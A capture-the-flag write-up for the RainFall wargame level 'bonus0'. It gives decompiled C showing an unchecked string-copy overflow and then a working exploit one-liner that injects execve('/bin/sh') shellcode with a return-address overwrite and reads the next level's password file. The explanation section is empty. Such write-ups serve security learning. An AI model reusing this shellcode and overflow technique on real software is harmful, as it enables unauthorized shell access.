## Step 1: Static & Dynamic Analysis

```c
080484b4    char* p(char* buff, char* tild)
080484b4    {
080484b4        puts(tild);
080484e1        void tmp;
080484e1        read(0, &tmp, 4096);
080484fc        *(uint8_t*)strchr(&tmp, '\n') = 0;
0804851d        return strncpy(buff, &tmp, 20);
080484b4    }

0804851e    char* pp(char* str_main)
0804851e    {
0804851e        void buff_arg1;
08048534        p(&buff_arg1, " - ");
08048547        void buff_arg2;
08048547        p(&buff_arg2, " - ");
08048559        strcpy(str_main, &buff_arg1);
08048574        int32_t i = 0xffffffff;
08048577        char* str_main_ptr = str_main;
08048577        
08048579        while (i)
08048579        {
08048579            bool cond:0_1 = 0 != *(uint8_t*)str_main_ptr;
08048579            str_main_ptr = &str_main_ptr[1];
08048579            i -= 1;
08048579            
08048579            if (!cond:0_1)
08048579                break;
08048579        }
08048579        
08048588        *(uint16_t*)(~i - 1 + str_main) = 32;
080485a3        return strcat(str_main, &buff_arg2);
0804851e    }

080485a4    int32_t main(int32_t argc, char** argv, char** envp)
080485a4    {
080485a4        void str_main;
080485b4        pp(&str_main);
080485c0        puts(&str_main);
080485cb        return 0;
080485a4    }
```

### Explanation


## Step 2: Exploiting the Binary
```bash
bonus0@RainFall:~$ (python -c 'print(("A" * 20) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")' ; python -c 'print(("B" * 9) + "\xbf\xff\xe6\x94"[::-1] + "CCCCCCC")' ; cat) | /home/user/bonus0/bonus0

% cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```